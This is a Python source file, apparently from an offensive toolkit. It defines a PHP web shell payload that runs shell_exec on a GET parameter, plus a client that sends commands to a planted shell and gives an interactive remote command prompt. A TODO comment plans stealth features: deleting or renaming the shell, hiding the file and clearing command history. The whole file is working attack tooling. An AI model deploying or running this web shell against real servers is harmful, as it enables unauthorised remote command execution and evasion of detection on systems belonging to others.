import subprocess
import requests
import sys
import os

from core.logger import Logger


class Shell:

    PAYLOAD = '<?php echo shell_exec($_GET["cmd"]); ?>'

    @staticmethod
    def execute(url, cmd):
        """ Execute shell command through web shell and return command output """
        res = requests.get(url, params={'cmd': cmd})

        if res.status_code == 200:
            output = res.text

            return output

        elif res.status_code == 404:
            Logger.error('web shell not found')

    @staticmethod
    def command_line(shell_url):
        """ Start web shell command line """

        # TODO: stealth mode:
        # - remove PHP web shell on loop exit
        # - rename PHP web shell // add hideden file attribute
        # ? clear command history

        user = Shell.execute(shell_url, 'whoami').strip()

        print()  # outputs a newline character, duh??

        while True:
            try:
                cmd = input(f'{user} $ ')
            except KeyboardInterrupt:
                return
            except EOFError:
                return

            cmd_stripped = cmd.strip().strip(' ').lower()

            if len(cmd_stripped) == 0:
                continue

            if cmd_stripped in ('cls', 'clear'):
                subprocess.call('cls' if os.name == 'nt' else 'clear', shell=True)

            elif cmd_stripped in ('exit', 'quit'):
                break

            else:
                try:
                    output = Shell.execute(shell_url, cmd)

                    if output is not None and len(output) > 0:
                        print(output)

                except Exception:
                    Logger.error('an error occurred while attempting to execute command')
